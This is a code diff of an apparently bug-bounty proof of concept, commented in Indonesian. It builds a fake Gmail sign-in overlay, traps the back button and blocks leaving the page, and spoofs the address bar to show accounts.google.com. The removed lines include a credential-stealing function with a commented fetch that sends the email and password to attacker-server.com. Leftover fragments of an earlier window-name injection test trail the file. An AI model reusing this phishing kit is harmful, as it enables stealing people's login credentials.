@@ -2,72 +2,47 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Sign in</title>
+    <title>Google Sign in</title>
 </head>
-<body style="font-family:sans-serif; text-align:center; padding-top:40px; background:#fff; margin:0;">
-    
+<body style="margin:0; padding:0; font-family: Arial, sans-serif;">
     <!-- UI Palsu -->
-    <div id="fakeUI" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999;">
-        <h2 style="margin-top:50px;">Sign in</h2>
-        <p style="color:#555; font-size:14px;">to continue to Gmail</p>
-        
-        <div style="display:inline-block; text-align:left; width:280px; margin-top:20px;">
-            <input type="text" id="email" placeholder="Email or phone" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;"><br>
-            <input type="password" id="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box;"><br>
-            <button onclick="stealCredentials()" style="width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-weight:bold; font-size:16px;">Next</button>
+    <div id="spoofUI" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:99999;">
+        <div style="text-align:center; padding-top:40px;">
+            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" width="100"><br><br>
+            <h2 style="font-weight:normal;">Sign in</h2>
+            <p style="color:#5f6368; font-size:14px;">to continue to Gmail</p>
+            <div style="width:280px; margin:0 auto; text-align:left; margin-top:20px;">
+                <input type="text" placeholder="Email or phone" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px; box-sizing:border-box;"><br>
+                <input type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px; box-sizing:border-box;"><br>
+                <button style="background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-weight:bold; float:right;">Next</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // 1. Cegah user untuk navigasi keluar / back (History Trap)
+        // 1. Kunci Address Bar agar tidak bisa di-back
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.go(1);
         };
 
-        // 2. Cegah dialog konfirmasi keluar halaman
+        // 2. Cegah user melakukan refresh (opsional, tapi bagus untuk persistence)
         window.onbeforeunload = function() {
             return "Data yang belum disimpan akan hilang.";
         };
 
-        // 3. Fungsi Pencurian Data (Exfiltration)
-        function stealCredentials() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
-            
-            if(!email || !pass) {
-                alert("Masukkan email dan password!");
-                return;
+        // 3. Race Condition: Paksa address bar berubah ke Google
+        // Gunakan setTimeout 0 atau requestAnimationFrame untuk menangkap frame sebelum render
+        setTimeout(function() {
+            // Trik: Ubah URL di address bar tanpa reload halaman
+            // Jika ini berhasil di Opera Mini, address bar akan berubah jadi Google
+            try {
+                window.history.replaceState({}, '', 'https://accounts.google.com/v3/signin/identifier?continue=https://mail.google.com');
+            } catch(e) {
+                // Fallback: Redirect (mungkin UI palsu akan hilang, tapi ini untuk test)
+                window.location.href = 'https://accounts.google.com';
             }
-
-            // --- UNTUK POC BOUNTY ---
-            // Karena kita tidak punya server, kita tampilkan alert sebagai bukti
-            alert("POC BERHASIL!\n\nKredensial dicuri:\nEmail: " + email + "\nPassword: " + pass);
-            
-            // --- UNTUK REAL ATTACK (Jika kamu punya server) ---
-            /*
-            fetch('https://attacker-server.com/log', {
-                method: 'POST',
-                body: JSON.stringify({ email: email, password: pass })
-            });
-            */
-        }
-
-        // 4. Trik Redirect Mikro-detik ke Target Asli
-        // Ini yang bikin address bar berubah jadi google.com (atau nyangkut)
-        setTimeout(() => {
-            window.location.href = "https://accounts.google.com";
         }, 10);
     </script>
-</body>
-</html>;
-            w.document.close();
-            log(`Window dibuka dengan nama: ${target}`);
-            log("Cek address bar: Apakah menampilkan 'about:blank' atau URL target?");
-        } catch(e) {
-            log("Window Name Injection gagal: " + e.message);
-        }
-    }
-</script>
 </body>
 </html>
